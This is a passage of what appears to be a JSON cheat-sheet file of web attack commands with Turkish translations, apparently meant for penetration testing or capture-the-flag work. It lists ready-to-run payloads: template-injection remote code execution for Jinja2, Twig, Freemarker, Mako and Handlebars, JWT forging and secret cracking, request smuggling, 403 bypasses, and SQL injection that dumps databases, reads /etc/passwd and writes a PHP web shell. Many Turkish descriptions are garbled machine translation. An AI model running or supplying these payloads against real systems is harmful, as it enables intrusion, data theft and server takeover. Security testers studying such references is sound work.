            "note": "Find subprocess.Popen index with: {{''.__class__.__mro__[1].__subclasses__()}}",
            "desc_tr": "RCE MRO class traversal üzerinden"
          },
          {
            "title": "SSTI Twig RCE",
            "desc": "Remote code execution via Twig (PHP)",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Uzaktan kod çalıştırma Twig (PHP) üzerinden"
          },
          {
            "title": "SSTI Freemarker RCE",
            "desc": "Remote code execution via Freemarker (Java)",
            "cmd": "curl 'http://<TARGET_IP>/page?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Uzaktan kod çalıştırma Freemarker (Java) üzerinden"
          },
          {
            "title": "SSTI ERB Ruby",
            "desc": "Code execution via ERB templates",
            "cmd": "curl 'http://<TARGET_IP>/page?name=<%25%3d+system(\"id\")+%25>'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "kod çalıştırma ERB templates üzerinden"
          },
          {
            "title": "SSTI Identify Engine",
            "desc": "Polyglot payload to identify template engine",
            "cmd": "curl 'http://<TARGET_IP>/page?name=${{<%25[%25'\"}}%25>.'",
            "tags": [
              "essential"
            ],
            "note": "Check error messages to identify template engine",
            "desc_tr": "Polyglot payload identify template engine'e"
          },
          {
            "title": "SSTI Jinja2 Class Traversal",
            "desc": "Access classes via MRO for RCE",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{''.__class__.__mro__[1].__subclasses__()}}\"",
            "tags": [
              "essential"
            ],
            "note": "Find subprocess.Popen index then use it for command execution",
            "desc_tr": "Access classes MRO for RCE üzerinden"
          },
          {
            "title": "SSTI Jinja2 Lipsum RCE",
            "desc": "RCE via lipsum global in Jinja2",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{lipsum.__globals__['os'].popen('id').read()}}\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE lipsum global Jinja2 üzerinden içinde"
          },
          {
            "title": "SSTI Jinja2 cycler RCE",
            "desc": "RCE via cycler object in Jinja2",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{cycler.__init__.__globals__.os.popen('id').read()}}\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE cycler object Jinja2 üzerinden içinde"
          },
          {
            "title": "SSTI Jinja2 Dump SECRET_KEY",
            "desc": "Extract Flask secret key via config",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{config.SECRET_KEY}}'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: Flask secret key config üzerinden"
          },
          {
            "title": "SSTI Twig Detection",
            "desc": "Test for Twig template engine (PHP)",
            "cmd": "curl 'http://<TARGET_IP>/page?name={{7*7}}'",
            "tags": [
              "essential"
            ],
            "note": "Twig returns 49 for {{7*7}}",
            "desc_tr": "Test et: for Twig template engine (PHP)"
          },
          {
            "title": "SSTI Freemarker Detection",
            "desc": "Detect Freemarker via assign",
            "cmd": "curl 'http://<TARGET_IP>/page?name=${7*7}'",
            "tags": [
              "essential"
            ],
            "note": "Freemarker uses ${} syntax",
            "desc_tr": "Algıla: Freemarker assign üzerinden"
          },
          {
            "title": "SSTI Mako RCE (Python)",
            "desc": "RCE via Mako template engine",
            "cmd": "curl \"http://<TARGET_IP>/page?name=<%25import os;x=os.popen('id').read()%25>${x}\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE Mako template engine üzerinden"
          },
          {
            "title": "SSTI Handlebars RCE",
            "desc": "RCE via Handlebars template (Node.js)",
            "cmd": "curl \"http://<TARGET_IP>/page?name={{#with 'constructor' as |a|}}{{#with (lookup . a)}}{{this ('return require(\\\"child_process\\\").execSync(\\\"id\\\")')()}}{{/with}}{{/with}}\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE Handlebars template (Node.js) üzerinden"
          },
          {
            "title": "SSTI Detect — {{7*7}}",
            "desc": "Basic SSTI detection",
            "cmd": "{{7*7}}",
            "tags": [
              "essential"
            ],
            "note": "If output is 49, template injection exists",
            "desc_tr": "Basic SSTI detection"
          },
          {
            "title": "SSTI Jinja2 — Config",
            "desc": "Access Flask config",
            "cmd": "{{config}}",
            "tags": [
              "essential"
            ],
            "desc_tr": "Access Flask config"
          },
          {
            "title": "SSTI Jinja2 — RCE lipsum",
            "desc": "RCE via lipsum globals",
            "cmd": "{{lipsum.__globals__['os'].popen('id').read()}}",
            "tags": [
              "essential"
            ],
            "desc_tr": "RCE lipsum globals üzerinden"
          },
          {
            "title": "SSTI Jinja2 — RCE cycler",
            "desc": "RCE via cycler",
            "cmd": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE cycler üzerinden"
          },
          {
            "title": "SSTI Mako RCE",
            "desc": "RCE in Mako",
            "cmd": "${__import__('os').popen('id').read()}",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RCE Mako içinde"
          },
          {
            "title": "SSTI Detection Polyglot",
            "desc": "Universal detection string",
            "cmd": "${{<%[%'\"}}%\\",
            "tags": [
              "essential"
            ],
            "note": "If output changes, SSTI likely",
            "desc_tr": "Universal detectistring üzerinde"
          }
        ],
        "name_tr": "Template Injection (SSTI)"
      },
      {
        "name": "JWT Attacks",
        "commands": [
          {
            "title": "JWT Decode (Manual)",
            "desc": "Decode JWT token parts manually",
            "cmd": "echo '<JWT_TOKEN>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çöz: zme JWT token parts manually"
          },
          {
            "title": "JWT None Algorithm Attack",
            "desc": "Forge JWT with alg:none to bypass signature",
            "cmds": [
              "# Change header to {\"alg\":\"none\",\"typ\":\"JWT\"}",
              "# Remove the signature (third part after second dot)",
              "# Send: header.payload."
            ],
            "tags": [
              "essential"
            ],
            "note": "Works if server doesn't validate algorithm",
            "desc_tr": "Sahte oluştur: JWT alg:none bypass signature ile'e"
          },
          {
            "title": "JWT Weak Secret Crack (Hashcat)",
            "desc": "Crack JWT HMAC secret with hashcat",
            "cmd": "hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kır: JWT HMAC secret hashcat ile"
          },
          {
            "title": "JWT Weak Secret Crack (john)",
            "desc": "Crack JWT HMAC secret with john",
            "cmd": "john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kır: JWT HMAC secret john ile"
          },
          {
            "title": "JWT Algorithm Confusion (RS256 to HS256)",
            "desc": "Switch RS256 to HS256 and sign with public key",
            "cmds": [
              "# 1. Get the server's public key",
              "# 2. Change alg from RS256 to HS256",
              "# 3. Sign the JWT using the public key as HMAC secret",
              "python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Works if server uses same key variable for both algorithms",
            "desc_tr": "Geçiş yap: RS256 HS256 and sign genel anahtar ile'e"
          },
          {
            "title": "JWT Tool Full Scan",
            "desc": "Automated JWT vulnerability scanning",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -M at -t 'http://<TARGET_IP>/api/protected' -rh 'Authorization: Bearer'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Otomatik JWT zafiyet(ler) tarama"
          },
          {
            "title": "JWT KID Injection",
            "desc": "Exploit kid header parameter for key injection",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv '../../../../../../dev/null' -S hs256 -p ''",
            "tags": [
              "advanced"
            ],
            "note": "kid parameter may be used to read arbitrary files as signing key",
            "desc_tr": "İstismar et: r kid header parameter for key enjeksiyon"
          },
          {
            "title": "JWT Decode",
            "desc": "Decode JWT token",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çöz: zme JWT token"
          },
          {
            "title": "JWT None Algorithm",
            "desc": "Bypass with none alg",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -X a",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: none alg ile"
          },
          {
            "title": "JWT Crack Secret",
            "desc": "Brute force HMAC secret",
            "cmds": [
              "python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt",
              "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HMAC secret"
          },
          {
            "title": "JWT Algorithm Confusion",
            "desc": "RS256 to HS256 attack",
            "cmd": "python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem",
            "tags": [
              "advanced"
            ],
            "desc_tr": "RS256 HS256 attack'e"
          }
        ],
        "name_tr": "JWT Attacks"
      },
      {
        "name": "CORS & HTTP Smuggling",
        "commands": [
          {
            "title": "CORS Misconfiguration Test",
            "desc": "Test if origin is reflected in CORS headers",
            "cmd": "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/ | grep -i 'Access-Control-Allow'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: if origis reflected in CORS headers içinde"
          },
          {
            "title": "CORS Null Origin Test",
            "desc": "Test if null origin is allowed",
            "cmd": "curl -s -I -H 'Origin: null' http://<TARGET_IP>/ | grep -i 'Access-Control-Allow'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: if null origis allowed içinde"
          },
          {
            "title": "CORS Wildcard Check",
            "desc": "Check if CORS allows all origins with credentials",
            "cmd": "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/api/ | grep -E 'Access-Control-Allow-(Origin|Credentials)'",
            "tags": [
              "essential"
            ],
            "note": "Vulnerable if Origin is reflected AND credentials: true",
            "desc_tr": "Kontrol et: if CORS allows tüm origins kimlik bilgileri ile"
          },
          {
            "title": "HTTP Request Smuggling CL.TE",
            "desc": "CL.TE smuggling test payload",
            "cmd": "printf 'POST / HTTP/1.1\\r\\nHost: <TARGET_IP>\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX' | nc <TARGET_IP> 80",
            "tags": [
              "advanced"
            ],
            "note": "Front-end uses Content-Length, back-end uses Transfer-Encoding",
            "desc_tr": "CL.TE smuggling test payload"
          },
          {
            "title": "HTTP Request Smuggling TE.CL",
            "desc": "TE.CL smuggling test payload",
            "cmd": "printf 'POST / HTTP/1.1\\r\\nHost: <TARGET_IP>\\r\\nContent-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nX\\r\\n0\\r\\n\\r\\n' | nc <TARGET_IP> 80",
            "tags": [
              "advanced"
            ],
            "note": "Front-end uses Transfer-Encoding, back-end uses Content-Length",
            "desc_tr": "TE.CL smuggling test payload"
          },
          {
            "title": "Smuggler Scanner",
            "desc": "Automated HTTP request smuggling detection",
            "cmd": "python3 smuggler.py -u http://<TARGET_IP>/",
            "tags": [
              "tool"
            ],
            "desc_tr": "Otomatik HTTP request smuggling detection"
          },
          {
            "title": "WebSocket Connection Test",
            "desc": "Connect to a WebSocket endpoint",
            "cmd": "websocat ws://<TARGET_IP>:<PORT>/ws",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağlan: a WebSocket endpoint'e"
          },
          {
            "title": "WebSocket XSS via Message",
            "desc": "Send XSS payload through WebSocket",
            "cmd": "websocat ws://<TARGET_IP>:<PORT>/ws <<< '<script>alert(1)</script>'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Send XSS payload WebSocket üzerinden"
          },
          {
            "title": "WebSocket SQLi via Message",
            "desc": "Send SQLi payload through WebSocket",
            "cmd": "websocat ws://<TARGET_IP>:<PORT>/ws <<< '{\"id\": \"1 OR 1=1-- -\"}'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Send SQLi payload WebSocket üzerinden"
          }
        ],
        "name_tr": "CORS & HTTP Smuggling"
      },
      {
        "name": "403 Bypass Techniques",
        "commands": [
          {
            "title": "403 Bypass — X-Original-URL",
            "desc": "Bypass via header",
            "cmd": "curl -H 'X-Original-URL: /admin' http://<TARGET_IP>/",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: header üzerinden"
          },
          {
            "title": "403 Bypass — X-Rewrite-URL",
            "desc": "Bypass via rewrite header",
            "cmd": "curl -H 'X-Rewrite-URL: /admin' http://<TARGET_IP>/",
            "tags": [
              "essential"
            ],
            "desc_tr": "Atla: rewrite header üzerinden"
          },
          {
            "title": "403 Bypass — Path Tricks",
            "desc": "Path normalization bypass",
            "cmds": [
              "curl http://<TARGET_IP>/admin..;/",
              "curl http://<TARGET_IP>/%2e/admin",
              "curl http://<TARGET_IP>//admin//",
              "curl http://<TARGET_IP>/./admin/./",
              "curl http://<TARGET_IP>/admin%20",
              "curl http://<TARGET_IP>/admin%09"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Path normalizatibypass üzerinde"
          },
          {
            "title": "403 Bypass — IP Spoofing",
            "desc": "Spoof internal IP via headers",
            "cmds": [
              "curl -H 'X-Forwarded-For: 127.0.0.1' http://<TARGET_IP>/admin",
              "curl -H 'X-Real-IP: 127.0.0.1' http://<TARGET_IP>/admin",
              "curl -H 'X-Custom-IP-Authorization: 127.0.0.1' http://<TARGET_IP>/admin"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Spoof internal IP headers üzerinden"
          }
        ],
        "name_tr": "403 Bypass Techniques"
      },
      {
        "name": "GraphQL Attacks",
        "commands": [
          {
            "title": "GraphQL Introspection",
            "desc": "Dump entire schema",
            "cmd": "curl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name}}}}\"}' | jq",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: entire schema"
          },
          {
            "title": "GraphQL Queries List",
            "desc": "List available queries",
            "cmd": "curl -s -X POST http://<TARGET_IP>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{queryType{fields{name description}}}}\"}' | jq",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: available queries"
          }
        ],
        "name_tr": "GraphQL Attacks"
      },
      {
        "name": "Open Redirect & CRLF",
        "commands": [
          {
            "title": "Open Redirect Payloads",
            "desc": "Common redirect payloads",
            "cmds": [
              "http://<TARGET_IP>/redirect?url=http://evil.com",
              "http://<TARGET_IP>/redirect?url=//evil.com",
              "http://<TARGET_IP>/redirect?url=\\/\\/evil.com"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Commredirect payloads üzerinde"
          },
          {
            "title": "CRLF Injection",
            "desc": "Inject headers via CRLF",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?param=value%0d%0aInjected-Header:true'",
              "curl 'http://<TARGET_IP>/page?param=value%0d%0a%0d%0a<script>alert(1)</script>'"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Enjekte et: headers CRLF üzerinden"
          },
          {
            "title": "Host Header Injection",
            "desc": "Test Host header poisoning",
            "cmds": [
              "curl -H 'Host: evil.com' http://<TARGET_IP>/",
              "curl -H 'X-Forwarded-Host: evil.com' http://<TARGET_IP>/reset-password"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: Host header poisoning"
          },
          {
            "title": "HTTP Verb Tampering",
            "desc": "Test access with different methods",
            "cmds": [
              "curl -X PUT http://<TARGET_IP>/admin",
              "curl -X DELETE http://<TARGET_IP>/admin",
              "curl -X PATCH http://<TARGET_IP>/admin"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: access different methods ile"
          }
        ],
        "name_tr": "Open Redirect & CRLF"
      }
    ],
    "name_tr": "Web Saldırı Teknikleri",
    "description_tr": "Exploit web application vulnerabilities including directory traversal, injection, file upload, and server-side attacks to gain unauthorized access."
  },
  {
    "id": "sqli",
    "name": "Database Exploitation via Injection",
    "icon": "🗃️",
    "description": "Detect and exploit SQL injection vulnerabilities to extract data, escalate privileges, and achieve remote code execution across major database platforms.",
    "subcategories": [
      {
        "name": "Injection Detection",
        "commands": [
          {
            "title": "SQLi Single Quote Test",
            "desc": "Test for SQL injection with single quote",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: for SQL enjeksiysingle quote ile üzerinde"
          },
          {
            "title": "SQLi Double Quote Test",
            "desc": "Test for SQL injection with double quote",
            "cmd": "curl 'http://<TARGET_IP>/page?id=1\"'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: for SQL enjeksiydouble quote ile üzerinde"
          },
          {
            "title": "SQLi OR True Test",
            "desc": "Boolean test — always true condition",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' OR '1'='1\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Boolean test — always true condition"
          },
          {
            "title": "SQLi OR False Test",
            "desc": "Boolean test — always false condition",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' OR '1'='2\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Boolean test — always false condition"
          },
          {
            "title": "SQLi AND True Test",
            "desc": "Boolean test — AND always true",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND '1'='1\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Boolean test — AND always true"
          },
          {
            "title": "SQLi AND False Test",
            "desc": "Boolean test — AND always false",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND '1'='2\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Boolean test — AND always false"
          },
          {
            "title": "SQLi Comment Test",
            "desc": "Test with comment to strip remainder of query",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: comment strip remainder of query ile'e"
          },
          {
            "title": "SQLi Time-Based Detection",
            "desc": "Detect blind SQLi via time delay",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND SLEEP(5)-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Algıla: blind SQLi time delay üzerinden"
          },
          {
            "title": "SQLi Stacked Query Test",
            "desc": "Test for stacked query support",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'; SELECT 1-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Test et: for stacked query support"
          },
          {
            "title": "SQLi ORDER BY Column Count",
            "desc": "Determine number of columns via ORDER BY",
            "cmds": [
              "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 1-- -\"",
              "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 2-- -\"",
              "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 3-- -\""
            ],
            "tags": [
              "essential"
            ],
            "note": "Increment until error — last success = column count",
            "desc_tr": "Determine number of columns ORDER BY üzerinden"
          }
        ],
        "name_tr": "Injection Detection"
      },
      {
        "name": "UNION Extraction",
        "commands": [
          {
            "title": "UNION Column Detection",
            "desc": "Find number of columns and visible positions",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,2,3-- -\"",
            "tags": [
              "essential"
            ],
            "note": "Adjust number of columns to match ORDER BY result",
            "desc_tr": "Bul: number of columns and visible positions"
          },
          {
            "title": "MySQL Version via UNION",
            "desc": "Extract MySQL version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,@@version,3-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: MySQL version"
          },
          {
            "title": "MySQL Current User via UNION",
            "desc": "Extract current database user",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,user(),3-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: mevcut database user"
          },
          {
            "title": "MySQL Current Database",
            "desc": "Extract current database name",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,database(),3-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: mevcut database name"
          },
          {
            "title": "MySQL List Databases",
            "desc": "Enumerate all databases",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm databases"
          },
          {
            "title": "MySQL List Tables",
            "desc": "Enumerate tables in a database",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='<DATABASE>'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tables a database içinde"
          },
          {
            "title": "MySQL List Columns",
            "desc": "Enumerate columns in a table",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='<TABLE>'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: columns a table içinde"
          },
          {
            "title": "MySQL Dump Data",
            "desc": "Extract data from specific columns",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(<COL1>,0x3a,<COL2>),3 FROM <DATABASE>.<TABLE>-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: data belirli columns üzerinden"
          },
          {
            "title": "MySQL Read File",
            "desc": "Read file from filesystem via SQL",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oku: file filesystem SQL üzerinden üzerinden"
          },
          {
            "title": "MySQL Write File",
            "desc": "Write a web shell via SQL injection",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yaz: a web kabuğu SQL enjeksiyüzerinden üzerinde"
          },
          {
            "title": "MSSQL Version via UNION",
            "desc": "Extract MSSQL version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,@@version,3-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: MSSQL version"
          },
          {
            "title": "MSSQL List Databases",
            "desc": "Enumerate MSSQL databases",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,name,3 FROM master.dbo.sysdatabases-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: MSSQL databases"
          },
          {
            "title": "MSSQL List Tables",
            "desc": "Enumerate MSSQL tables",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,name,3 FROM <DATABASE>.dbo.sysobjects WHERE xtype='U'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: MSSQL tables"
          },
          {
            "title": "PostgreSQL Version via UNION",
            "desc": "Extract PostgreSQL version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,version(),NULL-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: PostgreSQL version"
          },
          {
            "title": "PostgreSQL List Databases",
            "desc": "Enumerate PostgreSQL databases",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,datname,NULL FROM pg_database-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: PostgreSQL databases"
          },
          {
            "title": "PostgreSQL List Tables",
            "desc": "Enumerate PostgreSQL tables",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: PostgreSQL tables"
          },
          {
            "title": "SQLite Version via UNION",
            "desc": "Extract SQLite version",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,sqlite_version(),3-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: SQLite version"
          },
          {
            "title": "SQLite List Tables",
            "desc": "Enumerate SQLite tables",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: SQLite tables"
          },
          {
            "title": "SQLite Table Schema",
            "desc": "Get table DDL/schema",
            "cmd": "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='<TABLE>'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: table DDL/schema"
          }
        ],
        "name_tr": "UNION Extraction"
      },
      {
        "name": "Error-Based Extraction",
        "commands": [
          {
            "title": "MySQL ExtractValue Error",
            "desc": "Extract data via XML extractvalue error",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e))-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: data XML extractvalue error üzerinden"
          },
          {
            "title": "MySQL UpdateXML Error",
            "desc": "Extract data via XML updatexml error",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: data XML updatexml error üzerinden"
          },
          {
            "title": "MySQL Double Query Error",
            "desc": "Error-based extraction via double query",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Error-based extractidouble query üzerinden üzerinde"
          },
          {
            "title": "MSSQL Convert Error",
            "desc": "Extract data via CONVERT type error",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND 1=CONVERT(int,(SELECT @@version))-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: data CONVERT type error üzerinden"
          },
          {
            "title": "PostgreSQL Cast Error",
            "desc": "Extract data via CAST type error",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND 1=CAST((SELECT version()) AS int)-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Çıkart: data CAST type error üzerinden"
          }
        ],
        "name_tr": "Error-Based Extraction"
      },
      {
        "name": "Blind Boolean Extraction",
        "commands": [
          {
            "title": "Boolean Blind Version (MySQL)",
            "desc": "Extract version character by character",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND SUBSTRING(@@version,1,1)='5'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: versicharacter by character üzerinde"
          },
          {
            "title": "Boolean Blind Database Length",
            "desc": "Determine database name length",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND LENGTH(database())=<NUM>-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Determine database name length"
          },
          {
            "title": "Boolean Blind Database Name",
            "desc": "Extract database name one character at a time",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND SUBSTRING(database(),<POS>,1)='<CHAR>'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: database name one character at a time"
          },
          {
            "title": "Boolean Blind Table Count",
            "desc": "Count tables in current database",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=<NUM>-- -\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Count tables mevcut database içinde"
          },
          {
            "title": "Boolean Blind ASCII Extract",
            "desc": "Extract character via ASCII comparison",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -\"",
            "tags": [
              "advanced"
            ],
            "note": "Binary search for each character: narrow between 32-127",
            "desc_tr": "Çıkart: character ASCII comparisüzerinden üzerinde"
          }
        ],
        "name_tr": "Blind Boolean Extraction"
      },
      {
        "name": "Blind Time-Based Extraction",
        "commands": [
          {
            "title": "MySQL Time Blind Version",
            "desc": "Time-based version extraction",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Time-based versiextraction üzerinde"
          },
          {
            "title": "MySQL Time Blind Database",
            "desc": "Time-based database name extraction",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Time-based database name extraction"
          },
          {
            "title": "MSSQL Time Blind",
            "desc": "Time-based extraction on MSSQL",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'; IF(SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:3'-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Time-based extraction MSSQL üzerinde"
          },
          {
            "title": "PostgreSQL Time Blind",
            "desc": "Time-based extraction on PostgreSQL",
            "cmd": "curl \"http://<TARGET_IP>/page?id=1'; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END-- -\"",
            "tags": [
              "essential"
            ],
            "desc_tr": "Time-based extraction PostgreSQL üzerinde"
          },
          {
            "title": "SQLite Time Blind (Heavy Query)",
            "desc": "Time-based extraction on SQLite via heavy query",
